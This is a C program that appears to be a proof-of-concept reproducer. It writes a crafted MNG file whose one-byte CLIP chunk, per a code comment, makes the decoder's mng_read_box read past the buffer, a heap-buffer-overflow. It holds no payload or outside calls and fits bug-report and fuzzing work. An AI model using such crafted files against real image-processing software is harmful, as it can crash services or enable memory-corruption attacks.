#include <stdio.h>
#include <stdlib.h>

static void put32(FILE *f, unsigned int val) {
    fputc((val >> 24) & 0xff, f);
    fputc((val >> 16) & 0xff, f);
    fputc((val >>  8) & 0xff, f);
    fputc((val >>  0) & 0xff, f);
}

static unsigned int crc32_table[256];
static int table_initialized = 0;

static void init_crc32(void) {
    unsigned int i, j;
    for (i = 0; i < 256; i++) {
        unsigned int crc = i;
        for (j = 0; j < 8; j++) {
            if (crc & 1)
                crc = (crc >> 1) ^ 0xedb88320;
            else
                crc >>= 1;
        }
        crc32_table[i] = crc;
    }
    table_initialized = 1;
}

static unsigned int compute_crc32(const unsigned char *buf, unsigned int len) {
    unsigned int crc = 0xffffffff;
    unsigned int i;
    if (!table_initialized) init_crc32();
    for (i = 0; i < len; i++) {
        crc = crc32_table[(crc ^ buf[i]) & 0xff] ^ (crc >> 8);
    }
    return crc ^ 0xffffffff;
}

static void write_chunk(FILE *f, const char *type, const unsigned char *data, unsigned int len) {
    unsigned char buf[4 + len];
    unsigned int crc;
    put32(f, len);
    fwrite(type, 1, 4, f);
    fwrite(data, 1, len, f);
    {
        unsigned int i;
        for (i = 0; i < 4; i++) buf[i] = (unsigned char)type[i];
        for (i = 0; i < len; i++) buf[4 + i] = data[i];
    }
    crc = compute_crc32(buf, 4 + len);
    put32(f, crc);
}

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }
    /* MNG signature */
    fputc(0x8a, f); fputc(0x4d, f); fputc(0x4e, f); fputc(0x47, f);
    fputc(0x0d, f); fputc(0x0a, f); fputc(0x1a, f); fputc(0x0a, f);
    /* MHDR chunk (28 bytes) */
    {
        unsigned char mhdr[28];
        unsigned int vals[7] = {100, 100, 1, 1, 1, 0, 0};
        int i;
        for (i = 0; i < 7; i++) {
            mhdr[i*4+0] = (vals[i] >> 24) & 0xff;
            mhdr[i*4+1] = (vals[i] >> 16) & 0xff;
            mhdr[i*4+2] = (vals[i] >>  8) & 0xff;
            mhdr[i*4+3] = (vals[i] >>  0) & 0xff;
        }
        write_chunk(f, "MHDR", mhdr, 28);
    }
    /* CLIP chunk with length 1: only delta_type byte, no box data.
       mng_read_box(previous_box, p[0], &p[1]) will read 16 bytes starting at &p[1],
       which is past the end of the 1-byte chunk data -> heap-buffer-overflow */
    {
        unsigned char clip[1];
        clip[0] = 1; /* delta_type = 1 */
        write_chunk(f, "CLIP", clip, 1);
    }
    fclose(f);
    return 0;
}